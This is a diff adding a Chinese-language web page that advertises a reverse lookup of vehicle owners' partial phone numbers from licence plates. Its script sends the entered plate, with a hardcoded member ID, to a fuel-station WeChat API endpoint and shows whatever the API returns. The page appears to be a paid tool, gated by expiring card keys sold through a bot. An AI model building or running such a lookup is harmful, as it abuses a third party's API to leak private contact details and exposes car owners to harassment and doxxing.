@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta charset="utf-8" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>车牌模糊号查询</title>
+    <style>
+  /*去除按钮点击后的选中框*/
+*:focus {outline: none !important; }button,input[type="button"],input[type="submit"],input[type="reset"] {outline: none !important;border: none; }*:active {-webkit-tap-highlight-color: transparent; }@media print {*:focus {outline: none !important;}}
+  /*去除超链接的聚焦选中框*/
+a {outline: none !important;-webkit-tap-highlight-color: transparent !important;}a:active,a:focus {outline: 0 !important;}
+  /*去除输入控件轮廓线*/
+input, textarea {outline: none;}input:focus, textarea:focus {outline: none;box-shadow: none; }
+
+@keyframes fadeIn {
+  from {
+    transform: translateX(100px);
+    background-color:#000000;
+    margin:0px;     
+    filter: blur(5px);  
+    opacity: 0;     
+  }
+  to {    
+    background-color:#0d1116;
+    opacity: 1;     
+  }
+}
+.box,#result{
+  opacity: 0;   
+  animation: fadeIn 2s forwards; 
+}
+body{
+  margin:20px;background-color:#0d1116;
+  color:#cccccc;overflow-x: hidden;
+  }
+.box{
+  background-color:rgba(0,0,0,0.2);
+  text-align:center;
+  padding:10px;
+  border-radius:10px;   
+  }
+ input,textarea,select{
+  background-color:rgba(255,255,255,0.1);
+  padding:5px;
+  width:60%;
+  border: none;
+  border-radius:5px;
+  color:#fff;
+  }
+ iframe{
+  background-color:rgba(255,255,255,0.1);
+  border-radius:5px; 
+  border:none;
+  }
+button{
+  background-color:#0c254b;
+  color:#c0d0ff;
+  border:none;
+  padding:10px;
+  width:60%;
+  border-radius:8px; 
+ }
+button {
+  transition: all 0.3s ease; 
+  transform: scale(1); 
+}
+button:hover {
+  filter: brightness(0.5);
+  transform: scale(0.98);
+}
+button:active,
+button:focus {
+  transform: scale(1);
+}
+a{
+  color:#4c8bff;
+  }
+  #result { font-size:13px; margin-top: 20px; padding: 10px; background: rgba(255,255,255,0.01); border: 1px solid rgba(255,255,255,0.1);border-radius:5px;white-space: pre-wrap; word-break: break-all; }
+ </style>
+</head>
+<body>
+  
+    <div class="box">
+        <h3 style="margin-bottom:3px;">全国车牌 反车主模糊手机号</h3>
+           <p style="margin:3px auto 10px auto;font-size:13px;color:#fff;opacity:0.5;font-weight:900;">
+                概率模糊手机号 部分车牌无数据<br/>
+                点击输入测试车牌号：<a id="testID">鲁Q00t04</a>             
+            </p>
+            <script>
+             document.getElementById('testID').addEventListener('click', function() {var text = this.textContent.trim();document.getElementById('carNum').value = text;});
+            </script>
+        <input type="text" id="carNum" placeholder="请输入车牌号">
+        <p style="margin:3px"></p>
+        <button onclick="submitInfo()">提交查询</button>
+    </div>
+
+    <div id="result">等待操作...</div>
+
+    <script>
+        async function submitInfo() {
+            const carNum = document.getElementById('carNum').value;
+            const resultDiv = document.getElementById('result');
+            
+            resultDiv.innerText = "正在查询...";
+
+            const url = "https://lb.kunlunshiyou.com/station_pc/api/wechat/carInfo/add";
+             const headers = {
+                "Content-Type": "application/json",
+                "Accept": "*/*"                
+            };
+
+            const bodyData = {
+                "memberId": "1963517933289897984",
+                "carNum": carNum,
+                "colors": "bluecard",
+                "fuelId": "4",
+                "realName": "*",
+                "birthday": "20240101",
+                "sex": "2"
+            };
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: headers,
+                    body: JSON.stringify(bodyData),
+                    mode: 'cors' 
+                });
+
+                const text = await response.text();
+                resultDiv.innerText = "响应结果：\n" + text;
+            } catch (error) {
+                resultDiv.innerText = "错误：\n" + error.message + 
+                    "\n\n接口请求失败！";
+                console.error('Error:', error);
+            }
+        }      
+   </script>
+   
+  <script>
+function getUrlParam(name) {const reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");const r = window.location.search.substr(1).match(reg);if (r != null) return decodeURIComponent(r[2]);return null;}const kamiStr = getUrlParam('kami');const username = getUrlParam('username');
+if (!kamiStr || !username) {    setInterval(() => {if (document.getElementById('param-error-modal')) return;const mask = document.createElement('div');mask.id = 'param-error-modal';mask.style.cssText = `position: fixed;top: 0;left: 0;width: 100%;height: 100%;background: rgba(0,0,0,0.6);display: flex;justify-content: center;align-items: center;z-index: 99999999;opacity: 0;transition: opacity 0.3s ease;`;const modalBox = document.createElement('div');modalBox.style.cssText = `background: #fff;padding: 20px 30px;border-radius: 25px;font-size: 13px;color: #333;box-shadow: 0 4px 20px rgba(0,0,0,0.2);transform: scale(0.9);transition: transform 0.3s ease;`;modalBox.innerHTML = `
+          <center><img style="border-radius:10px;background-color:#fff;width:40%" 
+           src="
+               https://s3.getstickerpack.com/storage/uploads/sticker-pack/utyaduck2-1/sticker_20.gif?6caebfdccd0f294353aa397608a2d145&d=200x200               
+            "/></center>
+            <div style="font-weight:900;text-align: center; font-size: 20px; margin-bottom: 15px;">参数不全</div>                
+                检测到入口错误<br/>
+                请从正确入口重新进入…
+            </div>
+    `;mask.appendChild(modalBox);document.body.appendChild(mask);setTimeout(() => {mask.style.opacity = '1';modalBox.style.transform = 'scale(1)';}, 10);}, 500);} else {const waterMark = document.createElement('div');waterMark.id = "kamiWaterMark";waterMark.style.cssText = `position:fixed;top:5px;right:5px;z-index:9999999;background:#ccc;padding:5px;border-radius:25px 15px 5px 25px;font-family:"SimSun","宋体",serif;font-size:8px;color:#101010;display:flex;font-weight:900;align-items:center;gap:10px;pointer-events:none;user-select:none;box-shadow:0 2px 12px rgba(0,0,0,0.5);`;
+    const tgIcon = document.createElement('img');
+    tgIcon.src = "https://s1.aigei.com/src/img/png/bb/bb2d379396aa405da9d57fba0c81833d.png?imageMogr2/auto-orient/thumbnail/!282x282r/gravity/Center/crop/282x282/quality/85/%7CimageView2/2/w/282&e=2051020800&token=P7S2Xpzfz11vAkASLTkfHN7Fw-oOZBecqeJaxypL:AwT-V79rFdBd74kHuGiOfa9Q1hM=";
+    tgIcon.style.cssText = `width: 28px;height: 28px;border-radius: 50%;object-fit: cover;`;const textWrap = document.createElement('div');textWrap.style.lineHeight = "1.6";
+waterMark.appendChild(tgIcon);waterMark.appendChild(textWrap);document.body.appendChild(waterMark);function parseKamiTime(str) {const y = str.slice(0, 4);const m = str.slice(4, 6);const d = str.slice(6, 8);const h = str.slice(8, 10);const mi = str.slice(10, 12);const s = str.slice(12, 14);return new Date(`${y}-${m}-${d} ${h}:${mi}:${s}`).getTime();}const endTime = parseKamiTime(kamiStr);let expireFlag = false;function showExpireModal() {if (document.getElementById('expire-modal')) return;const mask = document.createElement('div');mask.id = 'expire-modal';mask.style.cssText = `position: fixed;top: 0;left: 0;width: 100%;height: 100%;background: rgba(0,0,0,0.6);display: flex;justify-content: center;align-items: center;z-index: 99999999;opacity: 0;transition: opacity 0.3s ease;`;const modalBox = document.createElement('div');modalBox.style.cssText = `background: #fff;padding: 20px 30px;border-radius: 25px;font-size: 13px;color: #333;box-shadow: 0 4px 20px rgba(0,0,0,0.2);transform: scale(0.9);transition: transform 0.3s ease;`;modalBox.innerHTML = `
+
+         <center><img style="border-radius:10px;background-color:#fff;width:40%" 
+           src="
+               https://s3.getstickerpack.com/storage/uploads/sticker-pack/utyaduck2-1/sticker_28.gif?6caebfdccd0f294353aa397608a2d145&d=200x200
+            "/></center>
+            <div style="font-weight:900;text-align: center; font-size: 20px; margin-bottom: 15px;">没有资格使用功能</div>
+            <div>🕒您的卡密已失效<br/>🚀当前为游客预览模式<br/>🚀请先返回机器人激活卡密…
+            </div>
+`;mask.appendChild(modalBox);document.body.appendChild(mask);setTimeout(() => {mask.style.opacity = '1';modalBox.style.transform = 'scale(1)';}, 10);}function countDown() {if (expireFlag) return;const now = Date.now();const diff = endTime - now;if (diff <= 0) {expireFlag = true;setInterval(() => {showExpireModal();}, 500);textWrap.innerHTML = `您好，${username}<br>卡密：已过期`;return;}const day = Math.floor(diff / (1000 * 60 * 60 * 24));const hour = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));const min = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));const sec = Math.floor((diff % (1000 * 60)) / 1000);textWrap.innerHTML = `欢迎，${username}<br>卡密：${day}天${hour}小时${min}分${sec}秒后到期`;}countDown();setInterval(countDown, 1000);}
+</script>
+</body>
+</html>
